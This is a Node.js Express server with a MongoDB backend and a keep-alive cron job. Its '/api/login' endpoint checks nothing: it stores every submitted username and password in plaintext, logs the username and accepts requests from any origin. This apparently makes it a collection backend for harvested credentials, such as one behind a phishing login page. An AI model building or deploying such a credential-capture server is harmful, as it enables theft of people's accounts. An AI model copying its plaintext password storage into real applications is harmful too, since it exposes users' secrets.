const express = require('express');
const mongoose = require('mongoose');
const dotenv = require('dotenv');
const cors = require('cors');
const cron = require('node-cron');
const https = require('https');
const http = require('http');

dotenv.config();

const app = express();
app.use(express.json());
app.use(cors());

// Connect to MongoDB
mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.error('Could not connect to MongoDB', err));

// User Schema
const userSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true },
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Login Endpoint (to store credentials)
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    
    try {
        const newUser = new User({ username, password });
        await newUser.save();
        console.log(`Saved user: ${username}`);
        res.status(201).json({ message: 'Login data stored successfully' });
    } catch (error) {
        console.error('Error saving user:', error);
        res.status(500).json({ error: 'Failed to store login data' });
    }
});

// Health check endpoint
app.get('/ping', (req, res) => {
    res.status(200).json({ status: 'alive', timestamp: new Date().toISOString() });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);

    // Self-ping every 14 minutes to prevent Render sleep
    const SERVER_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;

    cron.schedule('*/5 * * * *', () => {
        const url = `${SERVER_URL}/ping`;
        const client = url.startsWith('https') ? https : http;

        client.get(url, (res) => {
            console.log(`[Keep-alive] Ping sent to ${url} — Status: ${res.statusCode}`);
        }).on('error', (err) => {
            console.error(`[Keep-alive] Ping failed:`, err.message);
        });
    });

    console.log(`Keep-alive cron job started — pinging ${SERVER_URL}/ping every 5 minutes`);
});
